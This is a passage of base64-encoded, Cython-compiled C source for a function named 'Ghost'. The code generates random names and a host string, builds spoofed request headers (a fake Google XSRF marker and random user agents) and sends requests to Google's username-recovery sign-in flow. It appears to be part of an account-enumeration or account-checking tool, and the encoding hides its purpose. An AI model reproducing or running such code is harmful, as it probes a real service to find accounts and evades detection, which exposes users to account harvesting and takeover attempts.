19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIE5VTEwpOwogIGlmICh1bmxpa2VseSghX19weXhfY3VyX3Njb3BlKSkgewogICAgX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0ICopUHlfTm9uZSk7CiAgICBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgICBfX1BZWF9FUlIoMCwgMTIxLCBfX3B5eF9MMV9lcnJvcikKICB9IGVsc2UgewogICAgX19QeXhfR09UUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7CiAgfQoKICAKICB7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzIsICZfX3B5eF90XzMpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOwogICAgIHsKCiAgICAgIAogICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F6ZXJ0eXVpb3BtbGtqaGdmZHNxd3hjdmJuKTsKICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXplcnR5dWlvcG1sa2poZ2Zkc3F3eGN2Ym4pOwogICAgICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3ZfYWxwaGFiZXQgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXplcnR5dWlvcG1sa2poZ2Zkc3F3eGN2Ym47CgogICAgICAKICAgICAgX19weXhfdF81ID0gTlVMTDsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcmFuZ2UpOwogICAgICBfX3B5eF90XzYgPSBfX3B5eF9idWlsdGluX3JhbmdlOyAKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kcmFuZ2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMjQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTI0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX3B5eF90XzkgPSAxOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfdF84fTsKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEyNCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIH0KICAgICAgX19weXhfdF82ID0gX19weXhfcGZfMmF3XzVHaG9zdF9nZW5leHByKCgoUHlPYmplY3QqKV9fcHl4X2N1cl9zY29wZSksIF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEyNCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19weXhfdF80ID0gX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTI0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX3B5eF90XzYgPSBQeVVuaWNvZGVfSm9pbihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XywgX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTI0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX3B5eF92X24xID0gKChQeU9iamVjdCopX19weXhfdF82KTsKICAgICAgX19weXhfdF82ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzQgPSBOVUxMOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9yYW5nZSk7CiAgICAgIF9fcHl4X3RfOCA9IF9fcHl4X2J1aWx0aW5fcmFuZ2U7IAogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRyYW5nZSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDEyNSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMV0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMjUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fcHl4X3RfOSA9IDE7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBfX3B5eF90Xzd9OwogICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTI1LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgfQogICAgICBfX3B5eF90XzggPSBfX3B5eF9wZl8yYXdfNUdob3N0XzNnZW5leHByKCgoUHlPYmplY3QqKV9fcHl4X2N1cl9zY29wZSksIF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDEyNSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgX19weXhfdF82ID0gX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoX19weXhfdF84KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTI1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX3B5eF90XzggPSBQeVVuaWNvZGVfSm9pbihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XywgX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTI1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX3B5eF92X24yID0gKChQeU9iamVjdCopX19weXhfdF84KTsKICAgICAgX19weXhfdF84ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzYgPSBOVUxMOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9yYW5nZSk7CiAgICAgIF9fcHl4X3RfNyA9IF9fcHl4X2J1aWx0aW5fcmFuZ2U7IAogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRyYW5nZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fcHl4X3RfOSA9IDE7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBfX3B5eF90XzV9OwogICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNywgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTI2LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgfQogICAgICBfX3B5eF90XzcgPSBfX3B5eF9wZl8yYXdfNUdob3N0XzZnZW5leHByKCgoUHlPYmplY3QqKV9fcHl4X2N1cl9zY29wZSksIF9fcHl4X3RfOCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgX19weXhfdF84ID0gX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoX19weXhfdF83KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTI2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX3B5eF90XzcgPSBQeVVuaWNvZGVfSm9pbihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XywgX19weXhfdF84KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTI2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX3B5eF92X2hvc3QgPSBfX3B5eF90Xzc7CiAgICAgIF9fcHl4X3RfNyA9IDA7CgogICAgICAKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMjgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FjY2VwdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fOCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMjgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FjY2VwdF9sYW5ndWFnZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hcl9JUV9hcl9xXzBfOV9lbl9JUV9xXzBfOF9lbl9xKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEyOCwgX19weXhfTDNfZXJyb3IpCgogICAgICAKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdGNvbmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxMzAsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NvbnRlbnRfdHlwZV9oZWFkZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMzAsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTMwLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb250ZW50X3R5cGVfZm9ybV9hbHQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMzAsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X3RfNSwgX19weXhfdF82KSA8ICgwKSkgX19QWVhfRVJSKDAsIDEyOCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nb29nbGVfYWNjb3VudHNfeHNyZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEyOCwgX19weXhfTDNfZXJyb3IpCgogICAgICAKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdGNvbmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXJfYWdlbnRfaGVhZGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTMyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX3B5eF90XzggPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmVyYXRlX3VzZXJfYWdlbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgX19weXhfdF85ID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF80KSkpIHsKICAgICAgICBfX3B5eF90XzggPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpOwogICAgICAgIGFzc2VydChfX3B5eF90XzgpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF80KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF84KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNCwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX3B5eF90XzkgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOCwgTlVMTH07CiAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgxLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICB9CiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTMyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF90XzUsIF9fcHl4X3RfNCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMjgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fcHl4X3ZfaGVhZGVycyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfNyA9IDA7CgogICAgICAKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdGNvbmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMzQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dvb2dsZV9hY2NvdW50c191cmwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMzQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMzQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9zaWduaW5fdjJfdXNlcm5hbWVyZWNvdmVyeV9mbG93KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTM0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX3B5eF92X3JlY292ZXJ5X3VybCA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNCk7CiAgICAgIF9fcHl4X3RfNCA9IDA7CgogICAgICAKICAgICAgX19weXhfdF83ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDEzNiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEzNiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19weXhfdF85ID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHsKICAgICAgICBfX3B5eF90XzcgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzYpOwogICAgICAgIGFzc2VydChfX3B5eF90XzcpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX3B5eF90XzkgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDEgOiAwKV0gPSB7X19weXhfdF83LCBfX3B5eF92X3JlY292ZXJ5X3VybH07CiAgICAgICAgX19weXhfdF81ID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTM2LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMzYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF81KTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTM2LCBfX